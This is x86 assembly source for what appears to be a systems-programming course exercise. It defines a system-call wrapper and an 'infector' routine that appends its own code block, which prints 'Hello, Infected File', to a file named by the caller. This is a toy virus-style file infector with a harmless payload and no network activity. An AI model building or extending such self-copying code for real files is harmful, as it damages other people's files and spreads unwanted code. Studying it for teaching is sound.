section .data
    helloMessage db 'Hello, Infected File', 0xA
    helloLen equ $-helloMessage
    newline: db 10  ; Define newline character
    extern strlen
    stdout: equ 1
    stdin dd 0    

section .text
    ;; Existing code from start.s up to system_call
    ; System call numbers
    CLOSE EQU 6
    OPEN EQU 5
    READ EQU 3
    WRITE EQU 4
    O_RDWR EQU 2
    O_APPEND EQU 1024
    EXIT EQU 1 
global _start
global system_call
global infection
global infector

extern main


_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret ; Back to caller


infection:
code_start:
    push dword helloLen
    push dword helloMessage
    push dword stdout 
    mov eax, WRITE ; sys_write system call number
    mov ebx, 1 ; File descriptor for stdout
    mov ecx, [esp + 4] ; Message address (second item on stack after push)
    mov edx, [esp + 8] ; Message length (top of stack)
    int 0x80 ; Perform the system call
    add esp, 12 ; Clean up the stack, only 3 pushes were made
    ret

; Infector function
infector:
    push ebp     ; Save the current state
    mov ebp, esp
    ; Print the file name
    ; Get the filename (first argument)
    mov ecx, [ebp+8]      ; ecx = pointer to the filename
    ; Calculate the length of the filename
    push ecx              ; Push the pointer to the filename as an argument to strlen
    call strlen           ; Call strlen to get the length of the filename
    add esp, 4            ; Clean up the stack
    ; Store the length in edx
    mov edx, eax          ; edx = length of the filename
    ; Set up the sys_write system call
    mov eax, WRITE           ; System call number for sys_write
    mov ebx, 1            ; File descriptor 1 (stdout)
    ; ecx is already set to the pointer to the filename
    ; edx is already set to the length of the filename
    ; Make the system call to print the filename
    int 0x80
    ; Restore the state
    
    ; Print newline character
    mov ebx, stdout   ; File descriptor for stdout
    mov ecx, newline  ; Newline character
    mov edx, 1        ; Length of newline character
    mov eax, 4        ; Syscall number for write
    int 0x80          ; Call kernel


    ; Open the file
    mov eax, OPEN
    mov ebx, [ebp+8]
    mov ecx, O_RDWR | O_APPEND
    mov edx, 0
    int 0x80
    mov [stdin], eax

    ; Write code_start to code_end to the file
    mov eax, WRITE
    mov ebx, [stdin]
    mov ecx, code_start
    mov edx, code_end - code_start
    int 0x80

    ; Close the file
    mov eax, CLOSE
    mov ebx, [stdin]
    int 0x80

    ; Restore stack and return
    pop ebp
    ret

code_end: